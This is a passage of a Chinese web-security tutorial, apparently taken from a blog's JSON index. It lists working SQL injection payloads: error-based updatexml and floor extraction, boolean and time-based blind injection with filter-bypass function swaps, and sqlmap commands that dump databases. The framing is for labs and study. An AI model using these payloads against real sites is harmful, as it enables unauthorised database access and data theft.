extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位 updatexml1234567爆数据库名：&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))爆表名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))爆列名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))爆数据：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e)) floor()：1234567爆数据库名：&#x27;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a爆表名：&#x27;union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a爆列名：&#x27;union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&quot;TABLE_NAME&quot; limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a爆数据：&#x27;union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a 布尔盲注当存在SQL注入时，攻击者无法通过页面或请求的返回信息，回显或获取到SQL注入语句的执行结果，这种情况就叫盲注。布尔型盲注就是利用返回的True或False来判断注入语句是否执行成功。它只会根据你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。 什么情况下考虑使用布尔盲注？ 1. 该输入框存在注入点。 2. 该页面或请求不会回显注入语句执行结果，故无法使用UNION注入。 3. 对数据库报错进行了处理，无论用户怎么输入都不会显示报错信息，故无法使用报错注入。 常用函数 1.length（str）函数 返回字符串的长度 2.substr（str,poc,len）截取字符串,poc表示截取字符串的开始位，len表示截取字符串的长度 3.ascii（）返回字符的ascii码，返回该字符对应的ascii码 4.count（）：返回当前列的数量 5.case when (条件) then 代码1 else 代码2 end :条件成立，则执行代码1，否则执行代码2 函数替换 12345678910111.如果程序过滤了substr函数，可以用其他函数代替：效果与substr（）一样2.left（str，index）从左边第index开始截取3.right(str，index)从右边第index开始截取4.substring（str，index）从左边index开始截取5.mid（str，index，len）截取str从index开始，截取len的长度6.lpad（str，len，padstr）7.rpad（str，len，padstr）在str的左（右）两边填充给定的padstr到指定的长度len，返回填充的结果8.如果程序过滤了 = （等于号），可以用in()、like代替，效果一样：9.如果程序过滤了ascii（），可以用hex()、bin（）、ord()代替，效果一样： 布尔盲注一般流程 因为盲注不能直接用database（）函数得到数据库名，所以步骤如下： 12345①判断数据库名的长度：and length(database())&gt;11 回显正常；and length(database())&gt;12 回显错误，说明数据库名是等于12个字符。②猜测数据库名（使用ascii码来依次判断）：and (ascii(substr(database(),1,1)))&gt;100 --+ 通过不断测试，确定ascii值，查看asciii表可以得出该字符，通过改变database（）后面第一个数字，可以往后继续猜测第二个、第三个字母…③猜测表名：and (ascii(substr((select table_name from information_schema.tables where table.schema=database() limit 1,1)1,1)&gt;144 --+ 往后继续猜测第二个、第三个字母…④猜测字段名（列名）：and (ascii(substr((select column_name from information_schema.columns where table.schema=database() and table_name=’数据库表名’ limit 0,1)1,1)&gt;105 --+ 经过猜测 ascii为 105 为i 也就是表的第一个列名 id的第一个字母;同样,通过修改 limit 0,1 获取第二个列名 修改后面1,1的获取当前列的其他字段.⑤猜测字段内容：因为知道了列名，所以直接 select password from users 就可以获取password里面的内容，username也一样 and (ascii(substr(( select password from users limit 0,1),1,1)))=68--+ 时间盲注界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。时间盲注与布尔盲注类似。时间型盲注就是利用时间函数的延迟特性来判断注入语句是否执行成功。 什么情况下考虑使用时间盲注？ 无法确定参数的传入类型。整型，加单引号，加双引号返回结果都一样 不会回显注入语句执行结果，故无法使用UNION注入 不会显示报错信息，故无法使用报错注入 符合盲注的特征，但不属于布尔型盲注 常用函数 sleep(n)：将程序挂起一段时间 n为n秒。 if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句。 使用sleep()函数和if()函数：`and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null)) --+` 如果返回正确则 页面会停顿10秒，返回错误则会立马返回。只有指定条件的记录存在时才会停止指定的秒数。 时间盲注一般流程 123456789101112131415161718①猜测数据库名称长度：输入：id=1&#x27; and If(length(database()) &gt; 1,1,sleep(5))--+用时：&lt;1s，数据库名称长度&gt;1…输入：id=1&#x27; and If(length(database()) &gt;8 ,1,sleep(5))--+用时：5s，数据库名称长度=8得出结论：数据库名称长度等于8个字符。②猜测数据库名称的一个字符：输入：id=1&#x27; and If(ascii(substr(database(),1,1))=97,sleep(5),1)--+用时：&lt;1s…输入：id=1&#x27; and If(ascii(substr(database(),1,1))=115,sleep(5),1)--+用时：5s得出结论：数据库名称的第一个字符是小写字母s。改变substr的值，以此类推第n个字母。最后猜出数据库名称。③猜测数据库表名：先猜测长度，与上面内容相似。④猜测数据库字段：先猜测长度，与上面内容相似。⑤猜测字段内容：先猜测长度，与上面内容相似。 sqlmap使用：指定位置注入1、-p，指定具体探测的参数 123sqlmap -u url -p id --dbs --对id进行探测 123sqlmap -u url -p &quot;id,name&quot; --dbs --对id和name都进行探测 2、–skip，忽略探测的参数 123sqlmap -u url --level 5 --skip host --dbs --5级对所有存在的注入点进行探测，这里忽略了host get型1、查看所有「数据库」 1sqlmap -u &#x27;http://xx/?id=1&#x27; --dbs 2.查看「数据表」 1sqlmap -u &#x27;http://xx/?id=1&#x27; -D [数据库名] --tables 3.查看「数据」 1sqlmap -u &#x27;http://xx/?id=1&#x27; -D [数据库名] -T [数据库表名] --dump post型1.使用bp抓包并标注注入点（在后面加*） 复制数据包内容到kali并保存为文档 使用sqlmap注入 12sqlmap -r 1.txt --dbs 12sqlmap -r 1.txt -D pikachu --tables 余下步骤与get型一样","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"web安全","slug":"安全/web安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]}],"categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"实验","slug":"安全/网络渗透测试/实验","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E9%AA%8C/"},{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"python","slug":"开发/python","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/"},{"name":"爬虫","slug":"开发/python/爬虫","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/%E7%88%AC%E8%99%AB/"},{"name":"靶场","slug":"安全/网络渗透测试/靶场","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%B6%E5%9C%BA/"},{"name":"web安全","slug":"安全/web安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/"},{"name":"Java","slug":"开发/Java","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/Java/"},{"name":"前端","slug":"开发/前端","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF/"},{"name":"数据结构","slug":"开发/数据结构","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"作业","slug":"安全/网络渗透测试/作业","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"实验","slug":"实验","permalink":"http://example.com/tags/%E5%AE%9E%E9%AA%8C/"},{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"},{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"},{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"},{"name":"前端","slug":"前端","permalink":"http://example.com/tags/%E5%89%8D%E7%AB%AF/"},{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"作业","slug":"作业","permalink":"http://example.com/tags/%E4%BD%9C%E4%B8%9A/"}]}